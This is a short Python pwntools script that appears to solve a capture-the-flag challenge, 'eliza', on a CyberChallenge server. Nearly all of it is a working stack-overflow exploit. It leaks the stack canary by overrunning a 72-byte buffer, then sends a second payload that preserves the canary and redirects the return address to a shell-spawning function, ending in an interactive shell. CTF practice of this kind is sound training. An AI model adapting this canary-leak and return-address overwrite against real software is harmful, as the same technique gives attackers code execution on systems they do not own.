#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./eliza --host eliza.challs.cyberchallenge.it --port 9131
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './eliza')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'eliza.challs.cyberchallenge.it'
port = int(args.PORT or 9131)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x000000000040093a
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

offset_canary = 72

payload = b'a' * (offset_canary + 1)
io.sendafter(b'...\n', payload)
ret = io.recvline()

canary = b'\x00' + ret[81:88]
canary = u64(canary)
print(f'canary: {hex(canary)}')

payload = b'a' * offset_canary + p64(canary) + b'a' * 8 + p64(exe.symbols['sp4wn_4_sh311'])
io.sendafter(b'...\n', payload)
io.sendlineafter(b'...\n', b'')

io.interactive()

